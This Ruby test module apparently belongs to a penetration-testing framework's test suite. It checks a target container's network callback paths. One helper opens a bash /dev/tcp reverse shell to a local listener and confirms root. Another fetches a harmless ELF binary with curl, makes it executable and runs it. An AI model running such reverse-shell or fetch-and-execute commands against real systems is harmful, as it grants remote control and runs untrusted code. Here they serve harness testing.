# frozen_string_literal: true

# Calibrate the real callback and HTTP/ELF paths before blaming an owner session.
module InetutilsPrerequisites
  def it_native_shell
    callback = @rc.fetch(:callback)
    server = TCPServer.new(callback.fetch(:bind), 0)
    port = server.local_address.ip_port
    token = 'inetutils-native-shell-' + Process.pid.to_s
    receiver = Thread.new do
      peer = nil
      Timeout.timeout(10) do
        peer = server.accept
        peer.write("printf '%s\\n' #{token};id -u;printf '%s\\n' #{token}-done;exit\n")
        data = String.new
        data << peer.readpartial(4096) until data.include?(token + "-done\n")
        data
      end
    ensure
      peer&.close
    end
    receiver.report_on_exception = false
    command = "exec 3<>/dev/tcp/#{callback.fetch(:host)}/#{port};sh <&3 >&3 2>&3"
    _output, exitstatus = rc_command('native-bash-shell', 'app', 'bash', '-c', command, required: false)
    expect(exitstatus).to eq(0)
    response = Timeout.timeout(12) { receiver.value }
    expect(response.lines.map(&:strip)).to include(token, '0', token + '-done')
    @rc[:native_shell] = { port: port, response_base64: Base64.strict_encode64(response.b), uid: 0 }
    rc_save
  ensure
    server&.close
    receiver&.kill if receiver&.alive?
    receiver&.join
  end

  def it_native_fetch
    callback = @rc.fetch(:callback)
    executable = File.join(target_runtime.fetch('artifacts'), 'native-exit64')
    command = ['nasm', '-f', 'bin', '-DARCH=64', 'test/module_targets/druid_sessions/native_exit.asm', '-o', executable]
    output, error, status = Open3.capture3(*command)
    @rc.fetch(:commands) << { label: 'assemble-native-elf', argv: command, exit: status.exitstatus, stdout_base64: Base64.strict_encode64(output.b), stderr: error }
    expect(status.success?).to be(true), output + error
    bytes = File.binread(executable)
    expect(bytes.byteslice(0, 5)).to eq("\x7fELF\x02".b)
    server = TCPServer.new(callback.fetch(:bind), 0)
    port = server.local_address.ip_port
    resource = '/inetutils-native-' + Process.pid.to_s
    destination = '/tmp/module-target-inetutils-native-fetch-' + Process.pid.to_s
    receiver = Thread.new do
      peer = nil
      Timeout.timeout(10) do
        peer = server.accept
        request = String.new
        request << peer.readpartial(4096) until request.include?("\r\n\r\n")
        peer.write("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: #{bytes.bytesize}\r\nConnection: close\r\n\r\n".b + bytes)
        request
      end
    ensure
      peer&.close
    end
    receiver.report_on_exception = false
    expect(it_file(destination).fetch('exists')).to be(false)
    rc_command('native-fetch-curl', 'app', 'curl', '--fail', '--silent', '--show-error', '--max-time', '6', "http://#{callback.fetch(:host)}:#{port}#{resource}", '-o', destination)
    request = Timeout.timeout(12) { receiver.value }
    expect(request).to start_with("GET #{resource} HTTP/1.1\r\n")
    rc_command('native-fetch-chmod', 'app', 'chmod', '755', destination)
    code = "import hashlib,json,os,subprocess,sys;from pathlib import Path;p=Path(sys.argv[1]);r=subprocess.run([str(p)],timeout=3);print(json.dumps({'uid':os.geteuid(),'exit':r.returncode,'sha256':hashlib.sha256(p.read_bytes()).hexdigest()}))"
    output, = rc_command('native-fetch-execute', 'app', 'python3', '-c', code, destination)
    result = JSON.parse(output)
    expect(result).to eq('uid' => 0, 'exit' => 42, 'sha256' => Digest::SHA256.hexdigest(bytes))
    @rc[:native_fetch] = { result: result, request: request, source: 'test/module_targets/druid_sessions/native_exit.asm' }
    rc_save
  ensure
    if destination
      rc_command('native-fetch-remove', 'app', 'rm', '-f', destination)
      expect(it_file(destination).fetch('exists')).to be(false)
    end
    server&.close
    receiver&.kill if receiver&.alive?
    receiver&.join
  end
end
